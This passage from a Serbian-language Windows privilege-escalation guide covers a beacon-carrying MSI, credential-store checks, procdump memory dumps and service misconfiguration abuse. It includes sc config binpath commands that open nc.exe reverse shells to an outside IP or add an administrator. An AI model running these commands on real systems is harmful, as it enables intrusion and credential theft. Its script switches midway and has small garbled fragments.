Pročitajte ovaj vodič da biste saznali kako da napravite MSI wrapper pomoću ovog alata. Imajte na umu da možete da upakujete datoteku „**.bat**“ ako samo želite da **izvršite** **komandne linije**.

{{#ref}}
msi-wrapper.md
{{#endref}}

### Kreiranje MSI-ja pomoću WIX-a


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Kreiranje MSI-ja pomoću Visual Studio-a

- Pomoću Cobalt Strike-a ili Metasploit-a **generišite** novi **Windows EXE TCP payload** u `C:\privesc\beacon.exe`
- Otvorite **Visual Studio**, izaberite **Create a new project** i u polje za pretragu upišite „installer“. Izaberite projekat **Setup Wizard** i kliknite na **Next**.
- Dajte projektu ime, na primer **AlwaysPrivesc**, koristite `C:\privesc` kao lokaciju, izaberite **place solution and project in the same directory** i kliknite na **Create**.
- Klikćite na **Next** dok ne dođete do koraka 3 od 4 (izbor datoteka za uključivanje). Kliknite na **Add** i izaberite Beacon payload koji ste upravo generisali. Zatim kliknite na **Finish**.
- Označite projekat **AlwaysPrivesc** u **Solution Explorer-u**, a zatim u **Properties** promenite **TargetPlatform** sa **x86** na **x64**.
  - Možete da promenite i druga svojstva, kao što su **Author** i **Manufacturer**, kako bi instalirana aplikacija izgledala legitimnije.
- Kliknite desnim tasterom miša na projekat i izaberite **View > Custom Actions**.
- Kliknite desnim tasterom miša na **Install** i izaberite **Add Custom Action**.
- Dvaput kliknite na **Application Folder**, izaberite datoteku **beacon.exe** i kliknite na **OK**. Tako će se Beacon payload izvršiti čim pokrenete instalacioni program.
- U okviru **Custom Action Properties** promenite **Run64Bit** na **True**.
- Na kraju, **izgradite projekat**.
  - Ako se pojavi upozorenje `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, proverite da li ste platformu postavili na x64.

### Instalacija MSI-ja

Da biste **instalaciju** zlonamerne `.msi` datoteke izvršili **u pozadini:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Da biste iskoristili ovu ranjivost, možete upotrebiti: _exploit/windows/local/always_install_elevated_

## Antivirus i detektori

### Postavke revizije

Ove postavke određuju šta se **beleži**, zato treba da obratite pažnju.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding, zanimljivo je znati gde se šalju logovi.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** je osmišljen za **upravljanje lozinkama lokalnih administratora**, obezbeđujući da svaka lozinka bude **jedinstvena, nasumično generisana i redovno ažurirana** na računarima pridruženim domenu. Ove lozinke se bezbedno čuvaju u Active Directory-ju i mogu im pristupiti samo korisnici kojima su ACL-ovima dodeljene dovoljne dozvole, što im omogućava da vide lozinke lokalnih administratora ako su za to ovlašćeni.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ako je aktivan, **lozinke u čistom tekstu čuvaju se u LSASS-u** (Local Security Authority Subsystem Service).\
[**Više informacija o WDigest-u na ovoj stranici**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

Počevši od **Windows 8.1**, Microsoft je uveo poboljšanu zaštitu za Local Security Authority (LSA) kako bi **blokirao** pokušaje nepouzdanih procesa da **čitaju njegovu memoriju** ili ubacuju kod, čime se sistem dodatno štiti.\
[**Više informacija o LSA Protection ovde**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** je uveden u operativnom sistemu **Windows 10**. Njegova svrha je da zaštiti akreditive sačuvane na uređaju od pretnji kao što su pass-the-hash napadi. [**Više informacija o Credential Guard-u dostupno je ovde.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Keširani akreditivi

**Akreditive domena** proverava **Local Security Authority** (LSA), a koriste ih komponente operativnog sistema. Akreditivi domena za korisnika obično se uspostavljaju kada registrovani bezbednosni paket proveri podatke za prijavljivanje korisnika.\
[**Više informacija o keširanim akreditivima potražite ovde**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Korisnici i grupe

### Izlistaj korisnike i grupe

Treba da proverite da li neka od grupa kojima pripadate ima zanimljive dozvole.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Privilegovane grupe

Ako **pripadate nekoj privilegovanoj grupi, možda ćete moći da eskalirate privilegije**. Saznajte više o privilegovanim grupama i o tome kako da ih zloupotrebite za eskalaciju privilegija ovde:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulacija tokenima

**Saznajte više** o tome šta je **token** na ovoj stranici: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Pogledajte sledeću stranicu da biste **saznali više o zanimljivim tokenima** i kako da ih zloupotrebite:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Prijavljeni korisnici / Sesije

```bash
qwinsta
klist sessions
```

### Korisnički direktorijumi

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Politika lozinki

```bash
net accounts
```

### Dohvatanje sadržaja clipboard-a

```bash
powershell -command "Get-Clipboard"
```

## Pokrenuti procesi

### Dozvole za datoteke i fascikle

Pre svega, pri listanju procesa **proverite da li se u komandnoj liniji procesa nalaze lozinke**.\
Proverite da li možete **da prepišete neki pokrenuti binary** ili imate dozvole za pisanje u fasciklu sa binary-jem kako biste iskoristili moguće [**DLL Hijacking napade**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Uvek proverite da li su pokrenuti [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md); mogli biste da ih zloupotrebite za eskalaciju privilegija.

Debugger listener može kratko da bude aktivan, pa to što ga nema u jednom pasivnom snimku portova ne dokazuje da nikada nije bio izložen. Povežite svaki uočeni listener sa njegovim PID-om, vlasnikom procesa i mogućnošću korisnika sa nižim privilegijama da mu pristupi; samo ime aplikacije ili debug zastavica ne potvrđuju code execution između korisnika. Rutinsko izviđanje obavljajte pasivno, bez slanja debugger komandi.

**Provera dozvola nad binarnim datotekama procesa**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Provera dozvola za fascikle binarnih datoteka procesa (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort direktorijumi dinamičkih preprocesora

Snort 2 može da učitava deljene biblioteke iz direktorijuma `dynamicpreprocessor directory` navedenog u konfiguraciji izabranoj pomoću `snort.exe -c <config>`. Za zakazani zadatak ili servis koji pokreće Snort pod drugim nalogom, pregledajte baš tu konfiguraciju i ACL direktorijuma navedenog za module. Ako vaš token može da kreira datoteke u tom direktorijumu, ta putanja je kandidat za proveru mogućnosti izvršavanja koda prilikom sledećeg učitavanja modula od strane zadatka ili servisa. Proverite efektivne privilegije naloga pod kojim se proces pokreće, aktivnu konfiguraciju, kompatibilnost modula i sva ograničenja zabrane ili deljenja; sama mogućnost upisivanja u direktorijum ne dokazuje eskalaciju. [Snort's dynamic-preprocessor documentation](https://www.snort.org/documents/dpx-readme) opisuje učitavanje modula tokom izvršavanja.

### Privilegovani veb-servis sa korenom dokumenata u koji može da se upisuje

Na Windows Apache instalaciji, uporedite putanju izvršne datoteke servisa i nalog pod kojim se pokreće sa `DocumentRoot` direktivom u aktivnom `httpd.conf`. Za uobičajeni XAMPP raspored, pregledajte `C:\xampp\apache\conf\httpd.conf` i ACL konfigurisanog korena dokumenata, često `C:\xampp\htdocs`. Ako korisnik sa nižim privilegijama može da kreira datoteke u tom direktorijumu dok je Apache pokrenut kao `LocalSystem`, izvršavanje koda na strani servera može da pređe granicu privilegija hosta. Potvrdite da je servis pokrenut, da se sadržaj poslužuje sa tačne putanje i da rukovalac na strani servera obrađuje tip datoteke; mogućnost upisivanja u korenski direktorijum sama po sebi dokazuje samo kreiranje datoteka. Pregledajte ACL-ove bez upisivanja probne datoteke:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Za konvencionalnu WAMP instalaciju, servis može upućivati na verzionisani `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (ili `C:\wamp\...` za 32-bitni raspored), sa konfiguracijom pored njega, u `conf\httpd.conf`, i podrazumevanim korenom `C:\wamp64\www` ili `C:\wamp\www`. Zajedno proverite tačnu putanju izvršne datoteke servisa, identitet pod kojim se pokreće, efektivni `DocumentRoot` (uključujući razrešavanje `${INSTALL_DIR}` i zamene u virtual hostovima) i ACL korena. To što je WAMP direktorijum upisiv ne dokazuje da se Apache pokreće kao `SYSTEM` ili izvršava poslatu datoteku. [Apache documents how a Windows service selects its configuration](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Upisiv IIS koren i mrežni identitet skupa aplikacija

Za IIS, povežite upisiv fizički direktorijum sa **aktivnim sajtom/aplikacijom** u `applicationHost.config`, a zatim utvrdite koji je skup aplikacija konfigurisan za njega i koji obrađivač radi na serveru. Kod smešten u direktorijumu koji se poslužuje izvršava se pod identitetom skupa samo ako IIS obrađuje taj tip datoteke i ako je ruta dostupna. Pre nego što upisiv direktorijum smatrate mogućnošću za izvršavanje koda, proverite efektivna prava trenutnog korisnika za kreiranje datoteka, stanje izvršavanja sajta, obrađivač i zamene podešavanja za konkretnu putanju.

Dinamička ASP.NET kompilacija uvodi zasebnu putanju koju treba proveriti: generisane datoteke u direktorijumu za kompilaciju aplikacije. Podrazumevano je to direktorijum `Temporary ASP.NET Files` ispod odgovarajuće instalacije .NET Framework-a, ali `<compilation tempDirectory>` aplikacije može da ga promeni. [Microsoft documents the location and per-application subdirectories](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) and [recommends isolating compilation directories when application pools do not trust each other](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Ako token sa nižim privilegijama može da izmeni generisani izvorni kod u kešu **konkretne** aplikacije, utvrdite da li ga aplikacija ponovo kompajlira pod privilegovanijim [worker-process identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). ACL datoteke ili direktorijuma sam po sebi ne dokazuje izvršavanje koda: povežite keš sa aktivnom aplikacijom, efektivnim tokenom i ACL-om, podešavanjima kompilacije, identitetom procesa i vremenom eventualne ponovne kompilacije. Koristite pregled metapodataka samo za čitanje; nemojte pokretati kompilaciju niti menjati datoteke keša tokom enumeracije.

IIS skup aplikacija konfigurisan kao `ApplicationPoolIdentity` ili `NetworkService` obično se za pristup domenskim resursima autentifikuje kao **nalog računara hosta**, iako njegov lokalni token može imati niske privilegije. `LocalSystem` već ima visoke lokalne privilegije i takođe koristi nalog računara na mreži; `LocalService` obično koristi anonimne mrežne akreditive. Skup `SpecificUser` koristi umesto toga konfigurisani nalog. [Microsoft documents these identity types](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) and [the application-pool network identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Izostavljeno podešavanje identiteta može naslediti podrazumevane vrednosti skupa, koje se razlikuju među generacijama IIS-a, zato utvrdite efektivnu konfiguraciju umesto da nagađate na osnovu imena skupa. Ako se izvršavanje koda odvija u skupu koji na mreži koristi identitet naloga računara, procenite prava u direktorijumu za **konkretan računar**. [DCSync](../active-directory-methodology/dcsync.md) zahteva prava replikacije nad kontekstом imenovanja domena; тикет налога рачунара или улога хоста сами по себи не доказују да та права постоје. Пасивна енумерација треба да прегледа конфигурацију и ACL-ове без отпремања датотеке, покретања мрежне аутентификације или захтевања тикета.

За читљив ASP.NET обрађивач који покреће помоћни процес, пратите сваку вредност изведену из захтева кроз аутентификацију, дешифровање, валидацију и састављање команде. Обрађивач који спаја декодирани токен са `ProcessStartInfo("cmd", "/c ...")` може дозволити метазнаковима љуске да измене команду; [Microsoft documents `cmd`'s special characters](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Утврдите да ли непоуздани позивалац заиста може да утиче на декодирану вредност и приступи обрађивачу, а затим утврдите ефективни идентитет скупа апликација или лажирани идентитет и идентитет подређеног процеса. Читљива линија изворног кода, слушалац на localhost-у или слабост формата токена сами по себи не доказују извршавање привилегованих команди. Прегледајте изворни код и конфигурацију скупа без слања фалсификованих захтева или покретања помоћног процеса током пасивне енумерације.

За PHP сервис на Windows-у, путања којом управља захтев, прослеђена функцији [`include` or `require`](https://www.php.net/manual/en/function.include.php), може da izvrši PHP datoteku upisivu od strane korisnika sa nižim privilegijama pod identitetom radnog procesa. Потврдите да захтев може да стигне до те наредбе, да разрешена путања показује на датотеку коју корисник са нижим привилегијама може да измени и коју радни процес може да прочита, да важећа PHP ограничења путања дозвољавају укључивање и да радни процес заиста има више привилегија. Слушалац на loopback адреси или уписива датотека сами по себи не успостављају овај ланац; прегледајте изворни код, идентитет сервиса и ACL-ове датотека без позивања крајње тачке током пасивне енумерације.

### Pronalaženje lozinki u memoriji

Možete napraviti dump memorije procesa koji je u toku pomoću **procdump** iz sysinternals-a. Servisi kao što je FTP imaju **akreditive u čistom tekstu u memoriji**; pokušajte da napravite dump memorije i pročitate akreditive.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Nesigurne GUI aplikacije

**Aplikacije koje se izvršavaju kao SYSTEM mogu omogućiti korisniku da pokrene CMD ili pregleda direktorijume.**

Primer: „Windows Help and Support“ (Windows + F1), potražite „command prompt“, kliknite na „Click to open Command Prompt“

### Uvoz projektnih datoteka sa privilegijama

Aplikacija koja automatski otvara projekte iz drop direktorijuma u koji korisnik sa nižim privilegijama može da upisuje prelazi granicu poverenja ulaza u kontekstu naloga uvoznika. Proverite **tačnu putanju u koju može da se upisuje**, proces ili zadatak koji je otvara, efektivni identitet i verziju parsera. [Istorijski problem sa otvaranjem/obnavljanjem Ghidra projekta](https://github.com/NationalSecurityAgency/ghidra/issues/71) omogućavao je XML external entities u metapodacima projekta; mrežni entitet na Windowsu mogao je da izazove autentifikaciju naloga uvoznika ako to dozvoljavaju [politike za odlazni SMB i NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking). To je trag koji može dovesti do izlaganja akreditiva, a ne do neposrednog administratorskog pristupa: odgovor mora da može da se iskoristi kroz zasebnu ovlašćenu ili ranjivu putanju, a trenutne verzije treba proveriti u odnosu na njihovo stvarno stanje zakrpa. Nemojte otvarati pripremljeni projekat tokom pasivne enumeracije; pregledajte tok uvoza i ACL-ove.

## Usluge

Pravo [`SC_MANAGER_CREATE_SERVICE` na objektu Service Control Manager (SCM)](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) se razlikuje od prav права за постојећу услугу. Успешан захтев за приступ само за читање [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) за то право је повод за проверу, а не доказ да нова услуга може да се покрене. [`CreateService` враћа handle](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) са приступом услузи затраженим приликом њеног креирања; касније поновно отварање услуге представља засебну проверу приступа и може да не успе чак и када би оригинални handle могао да се користи. Засебно проверите ефективни локални или удаљени токен, додељена права handle-а, налог услуге, политику покретања и путању до извршне датотеке. Немојте креирати нити покретати услугу током пасивне енумерације.

За удаљену путању инсталирања услуге, упоредите та SCM права са share-ом на циљном систему у који **исти мрежни налог** може да уписује, основним NTFS ACL-ом и локалном путањом до извршне датотеке коју налог услуге може да покрене. Налог који није администратор може да пређе ову границу ако постоје необично широка SCM права и могућност постављања датотеке; административни share није обавезан предуслов. Сам приступ за упис у share или само траг о SCM праву за креирање услуге не доказује да нова услуга може да се покрене са вишим идентитетом.

Постојећа услуга може да позове помоћну извршну датотеку при покретању, гашењу или неком другом догађају животног циклуса, чак и ако те датотеке нема у њеном `ImagePath`. Ако се име помоћне датотеке разреши у директоријум у који корисник са нижим привилегијама може да уписује, а услуга ради са вишим идентитетом, недостајућа датотека може да буде потенцијална мета за замену, зависно од услова. Потврдите **стварни код услуге или документовани позив помоћне датотеке**, разрешену путању до извршне датотеке и редослед претраге, права за креирање директоријума, идентитет услуге и доступан окидач животног циклуса. Директоријум услуге у који може да се уписује или сама недостајућа датотека нису доказ да услуга учитава ту датотеку; током пасивног прегледа не покрећите нити заустављајте услугу.

За постојећу услугу, [`SERVICE_START` омогућава прослеђивање аргумената функцији `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); то се разликује од права [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Прегледајте код услуге или њен документовани интерфејс пре него што право покретања третирате као нешто више од права за контролу. Ако услуга користи аргумент који бира позивалац као путању до евиденције или извоза, проверите идентитет услуге, тачан ток од аргумента до уписа, ограничења путање и дозволе за **креирану датотеку**. Упис у заштићени директоријум може довести до ескалације само ако постоји засебан привилеговани потрошач или учитавач који прихвата ту датотеку; евиденција у коју може да се уписује или право покретања сами по себи нису довољни. Пасивни попис не треба да покреће услугу нити да креира пробну датотеку.

За NSClient++ агент за надгледање, доступна датотека `nsclient.ini` представља **повод за преглед конфигурације**: у њој могу бити акредитиви за веб, док `boot.ini` може да преусмери конфигурацију на другу локацију. Проверите стварни налог услуге, WEB listener и политику приступа, као и да ли аутентификована улога може да мења подешавања или скрипте. За привилеговано извршавање додатно су потребни `CheckExternalScripts` (или друга омогућена путања за извршавање), ефективно право за регистровање или измену команде и окидач који је покреће под идентитетом услуге. Listener доступан само преко loopback интерфејса и даље може бити доступан локалном кориснику, али путања до датотеке, лозинка или listener сами по себи не доказују постојање тих права. Током пасивне енумерације прегледајте метаподатке и дозволе без приказивања тајни или позивања веб API-ја. Погледајте [распоред датотека NSClient++-а](https://nsclient.org/docs/concepts/file-layout/), [безбедносне смернице за веб и скрипте](https://nsclient.org/docs/setup/securing/) и [конфигурацију спољних скрипти](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

За услугу чији је `ImagePath` `nssm.exe`, проверите стварни налог под којим се услуга покреће и њену вредност `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM ту чува подређену апликацију](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), док је `AppDirectory` њен конфигурисани радни директоријум. Проверите подређену извршну датотеку и ACL-ове њеног надређеног директоријума пре него што права омотача сматрате целом границом услуге. Локална WCF или SOAP крајња тачка коју та подређена апликација излаже представља засебан траг за проверу: потврдите да је listener доступан кориснику са нижим привилегијама, да конкретна операција прихвата његов улаз и да подређена услуга извршава небезбедну операцију са вишим идентитетом. Налог услуге, URL крајње тачке или путања у коју може да се уписује сами по себи не доказују ескалацију; избегавајте позивање операција услуге током пасивне енумерације.

За прилагођену WCF операцију, пратите стринг под контролом позиваоца до било ког PowerShell runspace-а. [`Pipeline.Commands.AddScript` додаје текст скрипте](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), а [`Pipeline.Invoke` покреће pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` са Windows транспортним акредитивима](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) аутентификује клијента, али овлашћење за позивање те **конкретне** операције и ефективни идентитет runspace-а морају се проверити засебно. Путања од улаза позиваоца са нижим привилегијама до `AddScript`-а који се извршава под вишим идентитетом услуге представља границу за извршавање кода; порт на коме се ослушкује, аутентификовани клијент или некоришћени метод у неповезаном склопу сами по себи нису доказ. Статички прегледајте инсталирану услугу, уговор, овлашћења и подешавања impersonation-а, без позивања крајње тачке током енумерације.

Service Triggers омогућавају Windows-у да покрене услугу када се појаве одређени услови (активност именоване цеви/RPC крајње тачке, ETW догађаји, доступност IP адресе, прикључивање уређаја, освежавање GPO-а итд.). Чак и без права SERVICE_START често можете покренути привилеговане услуге активирањем њихових окидача. Технике за енумерацију и активирање погледајте овде:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Услуга за прикупљање дијагностичких података Visual Studio-а

Инсталације Visual Studio-а са C/C++ алатима могу да садрже `VSStandardCollectorService150`, дијагностичку услугу подешену да се покреће као `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) користио је јаншн и трку услед везе са Object Manager-ом да преусмери ресетовање DACL-а услуге. Демонстрирана ескалација је такође захтевала употребљиву путању за поправку Visual Studio Setup WMI Provider MSI-ја и њен циљ `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Компонента је исправљена у јануару 2024.

За пасивну тријажу, проверите налог и путању до бинарне датотеке те услуге, да ли постоји путања до Setup WMI компајлера и статус закрпе инсталиране компоненте. Ставка услуге, верзија производа Visual Studio или датотека компајлера сами по себи не доказују да је хост рањив. Преглед не захтева покретање услуге нити покретање поправке.

Набавите листу услуга:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Dozvole

Možete koristiti **sc** da biste dobili informacije o servisu.

```bash
sc qc <service_name>
```

Preporučuje se da imate binarni fajl **accesschk** iz _Sysinternals_ da biste proverili potreban nivo privilegija za svaku uslugu.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Preporučuje se da proverite da li grupa „Authenticated Users“ može da menja neku uslugu:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Ovde možete da preuzmete accesschk.exe za XP](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Omogućavanje servisa

Ako dobijate ovu grešku (na primer, sa SSDPSRV):

_Došlo je do sistemske greške 1058._\
_Usluga ne može da se pokrene zato što je onemogućena ili zato što nijedan uređaj povezan sa njom nije omogućen._

Možete da je omogućite pomoću ove komande、】【

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Imajte u vidu da servis upnphost zavisi od SSDPSRV-a da bi radio (za XP SP1)**

**Još jedno zaobilazno rešenje** ovog problema je da pokrenete:

```
sc.exe config usosvc start= auto
```

### **Izmena putanje binarne datoteke servisa**

U scenariju u kojem grupa „Authenticated users“ poseduje **SERVICE_ALL_ACCESS** nad servisom, moguće je izmeniti izvršnu binarnu datoteku servisa. Da biste izmenili i izvršili **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Ponovno pokretanje servisa

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Privilegije se mogu eskalirati pomoću različitih dozvola:

- **SERVICE_CHANGE_CONFIG**: Omogućava rekonfigurisanje binarne datoteke servisa.
- **WRITE_DAC**: Omogućava rekonfigurisanje dozvola, čime se stiče mogućnost menjanja konfiguracije servisa.
- **WRITE_OWNER**: Omogućava preuzimanje vlasništva i rekonfigurisanje dozvola.
- **GENERIC_WRITE**: Nasleđuje mogućnost menjanja konfiguracije servisa.
- **GENERIC_ALL**: Takođe nasleđuje mogućnost menjanja konfiguracije servisa.

Za otkrivanje i iskorišćavanje ove ranjivosti može se koristiti _exploit/windows/local/service_permissions_.

### Slabe dozvole nad binarnim datotekama servisa

Ako se servis izvršava kao **`LocalSystem`**, **`LocalService`**, **`NetworkService`** ili privilegovani domenski nalog, ali **korisnici sa niskim privilegijama mogu da menjaju EXE datoteku servisa ili njenu nadređenu fasciklu**, servis se često može oteti **zamenom binarne datoteke i ponovnim pokretanjem servisa**.

**Proverite da li možete da menjate binarnu datoteku koju izvršava servis** ili da li imate **dozvole za pisanje u fasciklu** u kojoj se datoteka nalazi ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Možete da dobijete sve binarne datoteke koje izvršava servis pomoću **wmic** (nije u system32) i da proverite svoje dozvole pomoću **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Možete koristiti i **sc** i **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Potražite opasne ACL-ove dodeljene grupama **`Everyone`**, **`BUILTIN\Users`** ili **`Authenticated Users`**, naročito **`(F)`**, **`(M)`** ili **`(W)`** za izvršnu datoteku servisa ili direktorijum koji je sadrži. Praktičan tok zloupotrebe:<sup>[[27]](#references)</sup>

1. Proverite nalog servisa i putanju izvršne datoteke pomoću `sc qc <service_name>`.
2. Proverite da li je binarna datoteka upisiva pomoću `icacls <path>`.
3. Zamenite binarnu datoteku servisa payload-om ili validnom zlonamernom binarnom datotekom servisa.
4. Ponovo pokrenite servis pomoću `sc stop <service_name> && sc start <service_name>` (ili sačekajte ponovno pokretanje sistema / okidač servisa).

Korisne automatizovane provere:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Ako usluga ne dozvoljava običnom korisniku da je ponovo pokrene, proverite da li se automatski pokreće pri pokretanju sistema, da li ima podešenu radnju pri grešci koja je ponovo pokreće ili može posredno da je pokrene aplikacija koja je koristi.

### Dozvole za izmenu registra usluga

Trebalo bi da proverite da li možete da izmenite neki registar usluge.\
Možete da **proverite** svoje **dozvole** nad **registrom** usluge ovako:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Originalni test dozvola bio je formulisan ovako:

Treba proveriti da li **Authenticated Users** ili **NT AUTHORITY\INTERACTIVE** imaju dozvole `FullControl`. Ako ih imaju, moguće je izmeniti binarnu datoteku koju servis izvršava.

Proverite da li **Authenticated Users** ili **NT AUTHORITY\INTERACTIVE** imaju dozvole za pisanje u registru za određeni ključ servisa. Sam ACL unos ne dokazuje da je pristup efektivno omogućen: važni su unosi za zabranu, trenutni token i nasleđene dozvole. Dozvole za ključ registra odvojene su od dozvola `SERVICE_CHANGE_CONFIG` i `SERVICE_START` za objekat servisa. Za eskalaciju su potrebni i upotrebljivo polje konfiguracije servisa, način da se servis pokrene i servisni identitet sa višim privilegijama. Pogledajte Microsoftove reference za [prava nad ključevima registra](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) i [prava pristupa servisima](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Da biste promenili putanju do binarne datoteke koju servis izvršava:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Trka sa simboličkom vezom u registru za proizvoljan upis vrednosti u HKLM (ATConfig)

